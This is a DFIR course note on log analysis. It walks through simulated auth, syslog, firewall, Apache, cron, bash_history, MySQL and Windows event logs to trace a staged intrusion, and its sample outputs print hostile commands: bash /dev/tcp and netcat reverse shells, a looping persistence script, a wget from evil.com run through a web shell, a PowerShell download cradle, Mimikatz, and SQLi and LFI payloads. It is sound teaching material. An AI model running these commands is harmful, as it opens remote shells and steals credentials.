# 🔍 Log Analysis in Digital Forensics
#cywarx #digital-forensics #log-analysis #unit-iv #dfir

---

> [!abstract] 📌 Module Overview
> This note covers **complete log analysis** for digital forensic investigations — what each log contains, how to read it, and how to identify incidents with **real terminal examples** showing input and output.
> 
> **Learning Path:**
> - [ ] Understand log types and their structure
> - [ ] Learn Linux log files in depth
> - [ ] Learn Windows Event logs
> - [ ] Practice incident identification
> - [ ] Build investigation timelines

---

## 📂 Table of Contents

1. [[#What is Log Analysis]]
2. [[#Golden Rules Before You Start]]
3. [[#Linux Log Files — Deep Dive]]
	- [[#auth.log — Authentication Events]]
	- [[#syslog — System Events]]
	- [[#kern.log — Kernel Events]]
	- [[#ufw.log — Firewall Traffic]]
	- [[#Apache Access & Error Logs]]
	- [[#dpkg.log — Package Manager]]
	- [[#cron.log — Scheduled Tasks]]
	- [[#wtmp btmp lastlog — Binary Logs]]
	- [[#bash_history — Command History]]
	- [[#mysql logs — Database Events]]
4. [[#Windows Event Logs — Deep Dive]]
5. [[#Incident Identification — Practical Examples]]
6. [[#Building a Forensic Timeline]]
7. [[#Tools Cheatsheet]]
8. [[#Quick Reference Table]]

---

## What is Log Analysis

> [!info] 💡 Simple Definition
> **Logs** are automatic text records that your OS, apps, and services write every time something happens — a login, a file access, a network connection, an error.
> 
> In forensics, logs = **your timeline of truth**. They tell you **who did what, when, and from where**.

```
EVENT HAPPENS → OS/App writes a log entry → Investigator reads it → Incident identified
```

**Why logs matter in DFIR:**
- Reconstruct attacker's steps (TTPs)
- Prove unauthorized access
- Identify compromised accounts
- Track data exfiltration
- Build evidence for legal proceedings

---

## Golden Rules Before You Start

> [!danger] ⚠️ NEVER Modify Original Logs
> Always work on a **copy**. Original logs must stay intact for chain of custody.

```bash
# Step 1 — Copy the logs you need
sudo cp /var/log/auth.log ~/forensics/auth.log.bak
sudo cp /var/log/syslog ~/forensics/syslog.bak
sudo cp /var/log/apache2/access.log ~/forensics/access.log.bak

# Step 2 — Hash them (chain of custody)
sha256sum ~/forensics/auth.log.bak > ~/forensics/auth.log.sha256
sha256sum ~/forensics/syslog.bak   > ~/forensics/syslog.sha256
```

**Terminal Output:**
```
# sha256sum output
a3f8d21e9b4c7e1a0f3b2d5c6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5  auth.log.bak
b7e9f21a4d3c8e2b1a0f5d6c7b8a9e0f1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6  syslog.bak
```

> [!tip] 💡 Pro Tip
> After analysis is complete, re-hash your working copy and compare with original hash. They must match — proves you didn't tamper with evidence.

```bash
# Verify after analysis
sha256sum ~/forensics/auth.log.bak
cat ~/forensics/auth.log.sha256

# If both outputs are identical → integrity maintained ✅
```

---

## Linux Log Files — Deep Dive

### auth.log — Authentication Events

> [!note] 📁 File Location
> - **Ubuntu/Debian:** `/var/log/auth.log`
> - **RHEL/CentOS:** `/var/log/secure`

**What it records:**
- SSH login attempts (success + failure)
- `sudo` command execution
- User account creation/deletion
- Password changes
- `su` (switch user) attempts
- PAM (Pluggable Auth Module) events
- Cron job authentication

---

#### 🔬 Reading auth.log — Line Structure

```
Apr  1 10:15:32  server  sshd[3321]:  Accepted password for hexx from 192.168.1.10 port 52100 ssh2
   │                │        │                │               │         │               │
TIMESTAMP        HOSTNAME  SERVICE[PID]     EVENT          USER       SOURCE_IP       PORT
```

---

#### 💻 Terminal — Reading auth.log

**Input:**
```bash
cat /var/log/auth.log | head -30
```

**Output:**
```log
Apr  1 10:15:32 server sshd[3321]: Accepted password for hexx from 192.168.1.10 port 52100 ssh2
Apr  1 10:15:32 server sshd[3321]: pam_unix(sshd:session): session opened for user hexx by (uid=0)
Apr  1 10:16:01 server sudo: hexx : TTY=pts/0 ; PWD=/home/hexx ; USER=root ; COMMAND=/usr/bin/apt update
Apr  1 10:20:44 server sshd[3400]: Failed password for root from 185.220.101.5 port 41233 ssh2
Apr  1 10:20:45 server sshd[3400]: Failed password for root from 185.220.101.5 port 41234 ssh2
Apr  1 10:20:46 server sshd[3400]: Failed password for root from 185.220.101.5 port 41235 ssh2
Apr  1 10:25:10 server useradd[4401]: new user: name=backdoor, UID=1004, GID=1004, home=/home/backdoor
Apr  1 10:25:15 server usermod[4402]: add 'backdoor' to group 'sudo'
Apr  1 10:45:00 server sshd[3321]: pam_unix(sshd:session): session closed for user hexx
Apr  1 11:00:01 server sshd[5500]: Invalid user admin123 from 10.10.10.5 port 44000
Apr  1 11:05:22 server su[5600]: FAILED su for root by hexx
```

---

#### 💻 Terminal — Find Brute Force from auth.log

**Input:**
```bash
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -10
```

**Output:**
```
    847  185.220.101.5
     23  10.10.10.5
      5  192.168.1.100
      2  172.16.0.5
```

> [!warning] 🚨 Incident Detected
> `185.220.101.5` attempted **847 failed logins** — this is a **brute force attack**.

**Input:**
```bash
# Check if brute force succeeded
grep "Accepted password" /var/log/auth.log | grep "185.220.101.5"
```

**Output:**
```log
Apr  1 03:47:13 server sshd[4521]: Accepted password for admin from 185.220.101.5 port 44231 ssh2
```

> [!danger] 🔴 CONFIRMED COMPROMISE
> Attacker from `185.220.101.5` successfully logged in as **admin** after 847 failed attempts.

---

#### 💻 Terminal — Find All sudo Commands

**Input:**
```bash
grep "sudo" /var/log/auth.log | grep "COMMAND"
```

**Output:**
```log
Apr  1 10:16:01 server sudo: hexx : COMMAND=/usr/bin/apt update
Apr  1 10:20:00 server sudo: hexx : COMMAND=/usr/bin/cat /etc/shadow
Apr  1 03:48:00 server sudo: admin : COMMAND=/usr/sbin/useradd -m -s /bin/bash backdoor
Apr  1 03:48:05 server sudo: admin : COMMAND=/usr/sbin/usermod -aG sudo backdoor
```

> [!warning] 🚨 Suspicious sudo Activity
> At `03:48:00` — attacker used `admin` account to create backdoor user and add it to **sudo group**.

---

#### 💻 Terminal — Find New Users Created

**Input:**
```bash
grep "new user\|useradd" /var/log/auth.log
```

**Output:**
```log
Apr  1 03:48:03 server useradd[5200]: new user: name=backdoor, UID=1005, GID=1005, home=/home/backdoor
```

**Input:**
```bash
# Confirm the user exists now
cat /etc/passwd | grep backdoor
```

**Output:**
```
backdoor:x:1005:1005::/home/backdoor:/bin/bash
```

**Input:**
```bash
# Check if they're in sudo
cat /etc/group | grep sudo
```

**Output:**
```
sudo:x:27:hexx,backdoor
```

> [!danger] 🔴 Backdoor Account Confirmed
> User `backdoor` was created at `03:48:03` by attacker and added to sudo group.

---

### syslog — System Events

> [!note] 📁 File Location
> - **Ubuntu/Debian:** `/var/log/syslog`
> - **RHEL/CentOS:** `/var/log/messages`

**What it records:**
- Service start/stop/crash events
- Kernel messages
- Hardware events (USB, disk)
- Network interface changes
- DHCP lease assignments
- OOM (Out of Memory) killer events
- Scheduled task events

---

#### 💻 Terminal — Reading syslog

**Input:**
```bash
grep "usb\|USB" /var/log/syslog
```

**Output:**
```log
Apr  1 09:15:33 server kernel: [12345.678] usb 1-1: new high-speed USB device number 3 using xhci_hcd
Apr  1 09:15:33 server kernel: [12345.890] usb 1-1: New USB device found, idVendor=0781, idProduct=5581
Apr  1 09:15:33 server kernel: [12345.900] usb-storage 1-1:1.0: USB Mass Storage device detected
Apr  1 09:15:34 server kernel: [12346.001] sd 6:0:0:0: [sdb] 15728640 512-byte logical blocks: (8.05 GB/7.50 GiB)
```

> [!warning] 🚨 USB Device Inserted
> A **USB mass storage device** (8GB) was plugged in at `09:15:33`. Investigate for data exfiltration.

**Input:**
```bash
# Check service crashes
grep "segfault\|SEGV\|killed\|core dump" /var/log/syslog
```

**Output:**
```log
Apr  1 09:10:05 server systemd[1]: apache2.service: Main process exited, code=killed, status=11/SEGV
Apr  1 09:10:05 server kernel: apache2[2201]: segfault at 00007f ip 00007f sp 00007fff error 4 in libc.so
```

**Input:**
```bash
# Find OOM killer events (malware consuming memory)
grep "Out of memory\|oom_kill" /var/log/syslog
```

**Output:**
```log
Apr  1 09:45:00 server kernel: Out of memory: Kill process 5523 (cryptominer) score 950 or sacrifice child
Apr  1 09:45:00 server kernel: Killed process 5523 (cryptominer) total-vm:2048000kB, anon-rss:1900000kB
```

> [!danger] 🔴 Cryptominer Detected
> Process named `cryptominer` was consuming ~1.9GB RAM — OOM killer terminated it.

---

### kern.log — Kernel Events

> [!note] 📁 File Location
> `/var/log/kern.log`

**What it records:**
- Driver loading/unloading
- Kernel module events
- Hardware interrupts
- Rootkit indicators (unexpected modules)
- Segmentation faults
- Firewall (netfilter) packet logs

---

#### 💻 Terminal — Detect Rootkit Module Loading

**Input:**
```bash
grep "module\|insmod\|rmmod" /var/log/kern.log
```

**Output:**
```log
Apr  1 03:00:01 server kernel: [55555.123] request_module: module loaded: hide_procs
Apr  1 03:00:02 server kernel: [55555.200] request_module: module loaded: hide_files
```

> [!danger] 🔴 Rootkit Activity
> Kernel modules `hide_procs` and `hide_files` are **NOT** standard Linux modules. This is a **rootkit** hiding processes and files.

**Input:**
```bash
# List currently loaded kernel modules
lsmod | grep -v "^Module"
```

**Output:**
```
Module                  Size  Used by
hide_procs             16384  0
hide_files             16384  0
nf_conntrack          163840  1
iptable_nat            16384  1
...
```

**Input:**
```bash
# Check when modules were last loaded (compare with incident time)
stat /sys/module/hide_procs
```

**Output:**
```
File: /sys/module/hide_procs
  Size: 0               Blocks: 0          IO Block: 4096   directory
Modify: 2026-04-01 03:00:01.123456789 +0000  ← matches incident time!
Change: 2026-04-01 03:00:01.123456789 +0000
```

---

### ufw.log — Firewall Traffic

> [!note] 📁 File Location
> `/var/log/ufw.log`

**What it records:**
- Every BLOCKED packet (default)
- Optionally ALLOWED packets
- Source IP, Destination IP
- Protocol (TCP/UDP/ICMP)
- Source Port, Destination Port
- TCP flags (SYN, ACK, FIN, RST)
- Network interface

---

#### 🔬 ufw.log Line Structure

```
Apr 1 02:00:01 server kernel: [UFW BLOCK] IN=eth0 OUT= SRC=185.220.101.5 DST=192.168.1.105 LEN=44 TTL=50 PROTO=TCP SPT=55123 DPT=22 SYN
   │                               │           │            │                   │                                         │        │    │
TIMESTAMP                        ACTION    INTERFACE     SOURCE_IP           DEST_IP                                  SRC_PORT DEST_PORT FLAG
```

---

#### 💻 Terminal — Detect Port Scanning

**Input:**
```bash
grep "UFW BLOCK" /var/log/ufw.log | grep "185.220.101.5" | awk '{print $17}' | sort -t= -k2 -n | head -20
```

**Output:**
```
DPT=21
DPT=22
DPT=23
DPT=25
DPT=80
DPT=443
DPT=3306
DPT=3389
DPT=8080
DPT=8443
```

> [!warning] 🚨 Port Scan Detected
> `185.220.101.5` hit 10 different ports in sequence — this is a **port scan** (likely Nmap).

**Input:**
```bash
# Count hits per second from suspicious IP
grep "185.220.101.5" /var/log/ufw.log | awk '{print $1, $2, $3}' | uniq -c | sort -rn | head -5
```

**Output:**
```
    23  Apr  1 02:00:01    ← 23 blocked packets in 1 second = scan
    18  Apr  1 02:00:02
    12  Apr  1 02:00:03
```

**Input:**
```bash
# Find outbound connections (reverse shell / C2 indicator)
grep "UFW ALLOW" /var/log/ufw.log | grep "OUT=eth0"
```

**Output:**
```log
Apr  1 03:49:10 server kernel: [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=4444 PROTO=TCP
Apr  1 03:50:10 server kernel: [UFW ALLOW] IN= OUT=eth0 SRC=192.168.1.105 DST=185.220.101.5 DPT=4444 PROTO=TCP
```

> [!danger] 🔴 Reverse Shell / C2 Beaconing
> Server is making **outbound connections to port 4444** on attacker IP every 60 seconds — classic **reverse shell beaconing**.

---

### Apache Access & Error Logs

> [!note] 📁 File Location
> - `/var/log/apache2/access.log`
> - `/var/log/apache2/error.log`
> - Nginx: `/var/log/nginx/access.log`

**What it records (access.log):**
- Every HTTP/HTTPS request
- Client IP address
- Timestamp
- HTTP Method (GET, POST, PUT, DELETE)
- URI requested (including parameters)
- HTTP response code
- Response size
- Referrer URL
- User-Agent string

**Log Format (Combined):**
```
IP  -  USER  [TIMESTAMP]  "METHOD URI VERSION"  STATUS  SIZE  "REFERER"  "USER-AGENT"
```

---

#### 💻 Terminal — Hunt for Web Attacks

**Input:**
```bash
# Hunt for SQL Injection attempts
grep -iE "union|select|insert|drop|'--|or\s+1=1|sleep\(|benchmark\(" /var/log/apache2/access.log
```

**Output:**
```log
185.220.101.5 - - [01/Apr/2026:02:55:44] "GET /login.php?id=1'%20OR%20'1'='1'-- HTTP/1.1" 200 512
185.220.101.5 - - [01/Apr/2026:02:55:50] "GET /login.php?id=1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables HTTP/1.1" 500 0
185.220.101.5 - - [01/Apr/2026:02:56:01] "GET /login.php?id=1%20AND%20SLEEP(5) HTTP/1.1" 200 512
```

**Input:**
```bash
# Hunt for Directory Traversal / LFI
grep -E "\.\./|etc/passwd|etc/shadow|proc/self" /var/log/apache2/access.log
```

**Output:**
```log
185.220.101.5 - - [01/Apr/2026:02:56:20] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 1823
185.220.101.5 - - [01/Apr/2026:02:56:25] "GET /download.php?file=../../../../etc/shadow HTTP/1.1" 403 0
```

> [!warning] 🚨 LFI Confirmed
> `/etc/passwd` was returned with **HTTP 200** — attacker successfully read system users file!

**Input:**
```bash
# Hunt for Web Shell activity
grep -E "\.php.*cmd=|\.php.*exec=|\.php.*system=|shell\.php" /var/log/apache2/access.log
```

**Output:**
```log
185.220.101.5 - - [01/Apr/2026:02:57:10] "POST /uploads/shell.php HTTP/1.1" 200 128
185.220.101.5 - - [01/Apr/2026:02:57:20] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 45
185.220.101.5 - - [01/Apr/2026:02:57:25] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 15
185.220.101.5 - - [01/Apr/2026:02:57:30] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1823
185.220.101.5 - - [01/Apr/2026:02:58:00] "GET /uploads/shell.php?cmd=wget+http://evil.com/malware HTTP/1.1" 200 55
```

> [!danger] 🔴 Web Shell Confirmed
> A PHP web shell was **uploaded then executed** — attacker ran system commands directly on the server.

**Input:**
```bash
# Identify scanner User-Agents
grep -iE "nikto|sqlmap|nmap|masscan|dirbuster|gobuster|wfuzz|burpsuite|w3af|acunetix|nessus" /var/log/apache2/access.log
```

**Output:**
```log
185.220.101.5 - - [01/Apr/2026:02:50:00] "GET / HTTP/1.1" 200 2048 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
185.220.101.5 - - [01/Apr/2026:02:52:00] "GET /DVWA/ HTTP/1.1" 404 0 "-" "Nikto/2.1.6"
185.220.101.5 - - [01/Apr/2026:02:53:00] "GET /admin HTTP/1.1" 404 0 "-" "DirBuster-1.0-RC1"
```

**Input:**
```bash
# Top attacking IPs by request count
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -10
```

**Output:**
```
   2341  185.220.101.5   ← Attacker (2341 requests)
    412  192.168.1.10    ← Normal user
     98  10.0.0.5
     45  172.16.0.1
```

**Input:**
```bash
# Find 4xx/5xx error spikes (scanning/brute force on web)
awk '{print $9}' /var/log/apache2/access.log | sort | uniq -c | sort -rn
```

**Output:**
```
   1823  200   ← successful requests
    847  404   ← not found (directory bruteforce)
    312  403   ← forbidden (blocked paths being probed)
     23  500   ← server errors (possible exploit crashes)
      5  302
```

---

### dpkg.log — Package Manager

> [!note] 📁 File Location
> - **Debian/Ubuntu:** `/var/log/dpkg.log`
> - **RHEL/CentOS:** `/var/log/yum.log` or `dnf.log`

**What it records:**
- Every package installed, removed, upgraded
- Package name and version
- Date and time
- Action status

---

#### 💻 Terminal — Hunt for Attacker Tool Installation

**Input:**
```bash
# Show all installations after compromise time (03:15)
grep "^2026-04-01 03:" /var/log/dpkg.log | grep "install"
```

**Output:**
```log
2026-04-01 03:15:22 install netcat-traditional:amd64 <none> 1.10-47
2026-04-01 03:15:45 install nmap:amd64 <none> 7.80+dfsg1-2
2026-04-01 03:16:00 install john:amd64 <none> 1.9.0-jumbo-1
2026-04-01 03:16:20 install hydra:amd64 <none> 9.0-1
2026-04-01 03:16:35 install proxychains4:amd64 <none> 4.14-1
```

> [!danger] 🔴 Attacker Toolkit Installed
> At `03:15`, after compromise, attacker installed: **netcat, nmap, john (password cracker), hydra (brute force), proxychains** — complete attacker toolkit.

---

### cron.log — Scheduled Tasks

> [!note] 📁 File Location
> - `/var/log/cron.log` (if separate)
> - Or inside `/var/log/syslog` (filter with `CRON`)

**What it records:**
- Which user ran which cron job
- Time of execution
- Exact command executed

---

#### 💻 Terminal — Hunt for Malicious Cron Jobs

**Input:**
```bash
grep "CRON" /var/log/syslog | grep "CMD"
```

**Output:**
```log
Apr  1 09:00:01 server CRON[6001]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
Apr  1 03:00:01 server CRON[6100]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)
Apr  1 03:01:01 server CRON[6101]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)
Apr  1 03:02:01 server CRON[6102]: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444 0>&1)
```

> [!danger] 🔴 Persistent Reverse Shell
> Cron job runs a **bash reverse shell** to attacker IP every minute — this is **persistence**.

**Input:**
```bash
# Check all crontabs
cat /etc/crontab
sudo crontab -l
sudo crontab -l -u root
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/ /etc/cron.daily/
```

**Output:**
```
# /etc/cron.d/sysupdate  ← suspicious filename
* * * * * root bash -i >& /dev/tcp/185.220.101.5/4444 0>&1

# Disguised as legitimate update task
@reboot root /tmp/.update/update.sh  ← starts on every reboot!
```

**Input:**
```bash
# Check startup persistence file
cat /tmp/.update/update.sh
```

**Output:**
```bash
#!/bin/bash
# System Update Service
while true; do
    bash -i >& /dev/tcp/185.220.101.5/4444 0>&1
    sleep 60
done
```

> [!danger] 🔴 Persistence Mechanism Confirmed
> Attacker planted a script disguised as "system update" that maintains a reverse shell loop **on every reboot**.

---

### wtmp btmp lastlog — Binary Logs

> [!note] 📁 File Locations
> | File | Location | Read With |
> |------|----------|-----------|
> | Login history (all) | `/var/log/wtmp` | `last` |
> | Failed logins | `/var/log/btmp` | `lastb` |
> | Last login per user | `/var/log/lastlog` | `lastlog` |

---

#### 💻 Terminal — Read Login History

**Input:**
```bash
last -F | head -20
```

**Output:**
```
hexx     pts/0        192.168.1.10     Wed Apr  1 10:15:32 2026 - Wed Apr  1 10:45:00 2026  (0:29)
admin    pts/1        185.220.101.5    Wed Apr  1 03:47:13 2026 - Wed Apr  1 05:10:00 2026  (1:22)
backdoor pts/2        185.220.101.5    Wed Apr  1 03:52:05 2026 - Wed Apr  1 05:09:55 2026  (1:17)
root     tty1                          Tue Mar 31 08:00:00 2026 - Tue Mar 31 08:05:00 2026  (0:05)
```

> [!warning] 🚨 Findings
> - `admin` logged in from attacker IP `185.220.101.5` at `03:47` for **1 hour 22 minutes**
> - `backdoor` (newly created account) also logged in from same IP

**Input:**
```bash
# Failed login attempts history
lastb | head -15
```

**Output:**
```
root     ssh:notty    185.220.101.5    Wed Apr  1 02:00:01 2026
root     ssh:notty    185.220.101.5    Wed Apr  1 02:00:02 2026
root     ssh:notty    185.220.101.5    Wed Apr  1 02:00:03 2026
admin    ssh:notty    185.220.101.5    Wed Apr  1 03:45:00 2026
admin    ssh:notty    185.220.101.5    Wed Apr  1 03:45:01 2026
admin    ssh:notty    185.220.101.5    Wed Apr  1 03:47:10 2026
```

**Input:**
```bash
# See last login per user — spot new accounts that have logged in
lastlog | grep -v "Never logged in" | grep -v "^Username"
```

**Output:**
```
Username         Port     From             Latest
root             tty1                      Tue Mar 31 08:00:00 +0000 2026
hexx             pts/0    192.168.1.10     Wed Apr  1 10:15:32 +0000 2026
admin            pts/1    185.220.101.5    Wed Apr  1 03:47:13 +0000 2026
backdoor         pts/2    185.220.101.5    Wed Apr  1 03:52:05 +0000 2026
```

---

### bash_history — Command History

> [!note] 📁 File Location
> - `/home/USERNAME/.bash_history`
> - `/root/.bash_history`

> [!warning] ⚠️ Not a Formal Log
> `bash_history` can be cleared or disabled by attackers, but is still valuable forensic evidence.

---

#### 💻 Terminal — Recover Attacker's Commands

**Input:**
```bash
cat /root/.bash_history
```

**Output:**
```bash
id
whoami
cat /etc/passwd
cat /etc/shadow
uname -a
ps aux
netstat -tulnp
wget http://185.220.101.5/malware.sh
chmod +x malware.sh
./malware.sh
useradd -m backdoor
usermod -aG sudo backdoor
echo 'backdoor:Password123' | chpasswd
crontab -e
echo "* * * * * bash -i >& /dev/tcp/185.220.101.5/4444 0>&1" >> /etc/crontab
history -c
```

> [!tip] 💡 Note
> Attacker ran `history -c` at the end to clear history — but `bash_history` is written on **session close**, so we still recovered it!

**Input:**
```bash
# Check if attacker tried to disable history
cat /home/admin/.bash_history | head -5
```

**Output:**
```bash
export HISTSIZE=0
unset HISTFILE
HISTFILE=/dev/null
```

> [!warning] 🚨 History Evasion
> Attacker set `HISTFILE=/dev/null` — commands sent to `/dev/null` (discarded). Use other logs to reconstruct activity.

---

### mysql logs — Database Events

> [!note] 📁 File Location
> - Error log: `/var/log/mysql/error.log`
> - General log: `/var/log/mysql/mysql.log` (if enabled)
> - Slow query: `/var/log/mysql/mysql-slow.log`

---

#### 💻 Terminal — Hunt SQLi in MySQL Logs

**Input:**
```bash
grep "Access denied\|Warning" /var/log/mysql/error.log | head -10
```

**Output:**
```log
2026-04-01T02:55:00.123456Z [Warning] Access denied for user 'root'@'185.220.101.5' (using password: YES)
2026-04-01T02:55:01.234567Z [Warning] Access denied for user 'admin'@'185.220.101.5' (using password: YES)
2026-04-01T02:55:44.345678Z [Note] Access granted for user 'webapp'@'localhost'
```

**Input:**
```bash
# If general log is enabled — find suspicious queries
grep -iE "information_schema|union.*select|drop.*table|load_file|into.*outfile" /var/log/mysql/mysql.log
```

**Output:**
```log
2026-04-01T02:56:00Z  185.220.101.5  Query  SELECT * FROM users WHERE id=1 OR 1=1--
2026-04-01T02:56:05Z  185.220.101.5  Query  SELECT table_name FROM information_schema.tables WHERE table_schema=database()
2026-04-01T02:56:10Z  185.220.101.5  Query  SELECT column_name FROM information_schema.columns WHERE table_name='users'
2026-04-01T02:56:15Z  185.220.101.5  Query  SELECT username,password FROM users
2026-04-01T02:56:20Z  185.220.101.5  Query  SELECT * FROM users INTO OUTFILE '/var/www/html/dump.txt'
```

> [!danger] 🔴 Full SQLi Attack Chain
> Attacker enumerated tables → dumped user credentials → wrote dump file to webroot for download.

---

## Windows Event Logs — Deep Dive

> [!note] 📁 File Location
> `C:\Windows\System32\winevt\Logs\*.evtx`
> 
> Tools: **Event Viewer**, **PowerShell Get-WinEvent**, **EvtxECmd**, **Chainsaw**

---

### Key Event IDs — Security.evtx

| Event ID | Event Name | What It Means | Forensic Use |
|---|---|---|---|
| **4624** | Logon Success | User logged in | Track who logged in + from where |
| **4625** | Logon Failure | Login failed | Brute force detection |
| **4634** | Logoff | Session ended | Calculate session duration |
| **4648** | Explicit Credential Logon | RunAs / PTH | Pass-the-hash detection |
| **4672** | Special Privileges Assigned | Admin session | Privilege escalation |
| **4688** | Process Creation | New process started | Malware execution |
| **4698** | Scheduled Task Created | New task added | Persistence mechanism |
| **4720** | User Account Created | New account | Backdoor account |
| **4732** | Member Added to Group | Group change | Privilege escalation |
| **4768** | Kerberos TGT Requested | AD auth started | AD recon |
| **4769** | Kerberos Service Ticket | Accessing service | Kerberoasting |
| **4771** | Kerberos Pre-Auth Failed | Bad password | Password spraying |
| **4776** | NTLM Auth Attempt | NTLM used | Pass-the-hash |
| **4104** | PowerShell Script Block | PS script ran | Malicious PS |

---

#### 💻 PowerShell — Investigate Windows Events

**Input:**
```powershell
# Get all failed logins (brute force detection)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} |
  Select-Object TimeCreated,
    @{N='Username';E={$_.Properties[5].Value}},
    @{N='SourceIP';E={$_.Properties[19].Value}},
    @{N='LogonType';E={$_.Properties[10].Value}} |
  Format-Table -AutoSize | Select-Object -First 20
```

**Output:**
```
TimeCreated           Username  SourceIP        LogonType
-----------           --------  --------        ---------
4/1/2026 3:45:00 AM   admin     185.220.101.5   3
4/1/2026 3:45:01 AM   admin     185.220.101.5   3
4/1/2026 3:45:02 AM   admin     185.220.101.5   3
4/1/2026 3:47:10 AM   admin     185.220.101.5   3
```

> [!info] 💡 Logon Types
> | Type | Meaning |
> |------|---------|
> | 2 | Interactive (local keyboard) |
> | 3 | Network (SMB, mapped drives) |
> | 10 | RemoteInteractive (RDP) |

**Input:**
```powershell
# Get successful RDP logins (LogonType=10)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
  Where-Object {$_.Properties[8].Value -eq 10} |
  Select TimeCreated,
    @{N='User';E={$_.Properties[5].Value}},
    @{N='IP';E={$_.Properties[18].Value}} |
  Format-Table
```

**Output:**
```
TimeCreated           User    IP
-----------           ----    --
4/1/2026 3:47:55 AM   admin   185.220.101.5
4/1/2026 3:52:05 AM   backdoor 185.220.101.5
```

**Input:**
```powershell
# Detect Kerberoasting — 4769 with RC4 encryption (0x17)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769} |
  Where-Object {$_.Properties[8].Value -eq '0x17'} |
  Select TimeCreated,
    @{N='AccountName';E={$_.Properties[0].Value}},
    @{N='ServiceName';E={$_.Properties[2].Value}},
    @{N='ClientIP';E={$_.Properties[6].Value}}
```

**Output:**
```
TimeCreated          AccountName  ServiceName      ClientIP
-----------          -----------  -----------      --------
4/1/2026 3:48:00AM   admin        MSSQLSvc/DC01    185.220.101.5
4/1/2026 3:48:05AM   admin        HTTP/webserver   185.220.101.5
```

> [!warning] 🚨 Kerberoasting Detected
> Attacker requested service tickets using **RC4 encryption** (weak, crackable offline) for MSSQL and HTTP services.

**Input:**
```powershell
# Find new user accounts created (4720)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720} |
  Select TimeCreated,
    @{N='NewAccount';E={$_.Properties[0].Value}},
    @{N='CreatedBy';E={$_.Properties[4].Value}}
```

**Output:**
```
TimeCreated          NewAccount   CreatedBy
-----------          ----------   ---------
4/1/2026 3:48:30AM   backdoor     admin
```

**Input:**
```powershell
# PowerShell malicious script detection (4104)
Get-WinEvent -Path "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4104]]" |
  Where-Object {
    $_.Message -like "*EncodedCommand*" -or
    $_.Message -like "*IEX*" -or
    $_.Message -like "*DownloadString*" -or
    $_.Message -like "*Invoke-Mimikatz*" -or
    $_.Message -like "*Invoke-Empire*"
  } | Select TimeCreated, Message | Format-List
```

**Output:**
```
TimeCreated : 4/1/2026 3:49:00 AM
Message     : Creating Scriptblock text (1 of 1):
              IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')

TimeCreated : 4/1/2026 3:49:30 AM
Message     : Creating Scriptblock text (1 of 1):
              Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

> [!danger] 🔴 Credential Dumping Confirmed
> Attacker downloaded and ran **Mimikatz** — the primary Windows credential dumping tool.

---

## Incident Identification — Practical Examples

> [!example] 🧪 Full Incident Investigation Workflow

### Step 1 — Initial Assessment

**Input:**
```bash
# What time frame are we looking at?
stat /var/log/auth.log

# Who is currently logged in?
w
who

# Any strange processes running?
ps aux | grep -v "^root\|^www-data\|^hexx" | head -20
```

**Output:**
```
# w command output
USER     TTY      FROM             LOGIN@   IDLE JCPU PCPU WHAT
hexx     pts/0    192.168.1.10     10:15    0.00s 0.05s 0.00s w
root     pts/1    185.220.101.5    03:47    6:22m 0.10s 0.10s /bin/bash

# ps aux suspicious processes
backdoor  7823  99.0  15.0  /tmp/.update/update.sh
root      7900   0.1   0.2  nc -e /bin/bash 185.220.101.5 4444
```

> [!danger] 🔴 Live Incident
> Attacker is **currently connected** (`pts/1` from `185.220.101.5`) and a **netcat reverse shell** is active!

### Step 2 — Determine Timeline

**Input:**
```bash
# Build quick timeline for 03:00-04:00 AM
grep "Apr  1 0[3-4]:" /var/log/auth.log /var/log/syslog /var/log/ufw.log 2>/dev/null | sort -k4
```

**Output:**
```
auth.log:Apr 1 03:00:01 CRON: (root) CMD (bash -i >& /dev/tcp/185.220.101.5/4444)
auth.log:Apr 1 03:45:00 sshd: Failed password for admin from 185.220.101.5
auth.log:Apr 1 03:47:13 sshd: Accepted password for admin from 185.220.101.5
auth.log:Apr 1 03:48:03 useradd: new user: name=backdoor
auth.log:Apr 1 03:48:05 usermod: add 'backdoor' to group 'sudo'
syslog:Apr  1 03:49:00 kernel: [UFW ALLOW] OUT=eth0 DST=185.220.101.5 DPT=4444
auth.log:Apr 1 03:52:05 sshd: Accepted password for backdoor from 185.220.101.5
```

---

## Building a Forensic Timeline

> [!tip] 💡 The Most Important Forensics Skill
> A timeline lets you tell the **complete story of the attack** — every step the attacker took, in order.

---

### Manual Timeline Building

**Input:**
```bash
# Merge multiple logs and sort chronologically
cat /var/log/auth.log \
    /var/log/syslog \
    /var/log/apache2/access.log \
    /var/log/ufw.log \
    2>/dev/null | sort -k1,3 | grep "Apr  1 0[2-4]" > ~/forensics/timeline.txt

wc -l ~/forensics/timeline.txt
head -30 ~/forensics/timeline.txt
```

### Using log2timeline / Plaso

**Input:**
```bash
# Install plaso
sudo apt install plaso-tools -y

# Create timeline from system logs
log2timeline.py ~/forensics/timeline.plaso /var/log/

# Sort and export to CSV
psort.py -o l2tcsv ~/forensics/timeline.plaso > ~/forensics/timeline_full.csv

# View filtered timeline
grep "185.220.101.5" ~/forensics/timeline_full.csv | sort
```

---

### Complete Attack Timeline — Reconstructed

```
